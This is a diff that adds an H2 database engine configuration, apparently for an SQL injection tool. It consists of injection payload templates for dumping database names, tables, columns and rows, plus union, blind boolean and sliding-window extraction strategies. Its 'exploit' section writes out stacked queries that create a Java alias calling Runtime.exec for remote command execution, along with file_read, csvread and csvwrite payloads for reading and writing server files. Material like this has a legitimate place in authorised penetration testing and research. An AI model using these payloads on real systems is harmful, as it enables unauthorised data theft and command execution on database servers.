@@ -1,0 +1,188 @@
+engine: H2
+
+resource:
+ info: |
+  concat(
+      concat_ws(
+          '${enclose_value_sql}',
+          h2version(),
+          database(),
+          user()
+      ),
+      '${trail_sql}'
+  )
+
+ schema:
+  database: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || cast(q as varchar)
+           || '${enclose_value_sql}'
+           order by r
+           separator '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select
+           cast(schema_name as varchar) r,
+           count(table_name) q
+       from information_schema.tables t
+       right join information_schema.schemata s
+       on t.table_schema = s.schema_name
+       group by r
+       ${limit}
+   ) x
+
+  table: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || cast(r as varchar)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           order by r
+           separator '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select table_name r
+       from information_schema.tables
+       where table_schema = '${database}'
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || cast(n as varchar)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           order by n
+           separator '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select column_name n
+       from information_schema.columns
+       where table_schema = '${database}'
+       and table_name = '${table}'
+       order by n
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select concat(
+        group_concat(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || cast(q as varchar)
+            || '${enclose_value_sql}'
+            order by r
+            separator '${separator_cell_sql}'
+        ),
+        '${trail_sql}'
+    ) from (
+        select
+            cast(${fields} as varchar) r,
+            count(*) q
+        from `${database}`.`${table}`
+        group by r
+        ${limit}
+    ) x
+   fields:
+    field: trim(ifnull(`${field.value}`, ''))
+    concat: "|| '%7f' ||"
+
+ exploit: |
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+    
+  rce:
+    createTable: |
+      ; create table %s (c varchar(255))
+      ; insert into %s (c) values ('%s')
+    scriptSimple: ; script simple to '%s' table %s
+    # alternative method not used
+    callCsvWrite: ; call csvwrite('%s', 'select * from %s')
+    dropAlias: ; drop alias exec_cmd
+    # prevent semi-colon incompatible with stack
+    createAlias: |
+      ; CREATE ALIAS exec_cmd AS 'String runCmd(String c) throws Exception {
+         return new String(Runtime.getRuntime().exec(c).getInputStream().readAllBytes())'||chr(59)||'
+      }'
+    runCmd: select exec_cmd('%s')||'${trail_sql}'
+  
+  file:
+    readFromPath: select file_read('%s', null)||'${trail_sql}'
+    # white-spaces trimmed from line start
+    # unused
+    createTable: |
+      ; create table %s (c varchar(9999)) as select * from csvread('%s', 'c', 
+        'charset=UTF-8 fieldSeparator='||CHAR(1)||' fieldDelimiter='||CHAR(1)||' preserveWhitespace=true'
+      )
+    readFromTempTable: select group_concat(c separator '\n')||'${trail_sql}' from %s
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           /**
+            * If reach end of string (concat(${lead}+NULL)) then concat nullifies the result
+            */
+           concat(
+               '${lead}',
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   /**
+                    * Minus '${lead}' should apply
+                    */
+                   ${capacity}
+               )
+           )
+   )
+  limit: limit ${limit.value}, 65536
+  failsafe: "'' || 1337${indice}7330%2b1"
+  calibrator: repeat('${calibrator_sql}', 65536)
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - h2 database
+   orderByErrorMessage:
+    - Order by expression "1337" must be in the result list in this case
+   engineSpecific: case ${test} when true then space(5) else stringencode('a') end = space(5)
+
+ binary:
+  test:
+   bin: |
+    substr(
+        (${injection}),
+        ${window.char},
+        1
+    )
+    %3E%3Dchar(${mid.int})
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
+
+ union:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select
+           concat(
+               '${lead}',
+               ${indice},
+               ${calibrator}
+           )
+   )
+  orderBy: order by 1337
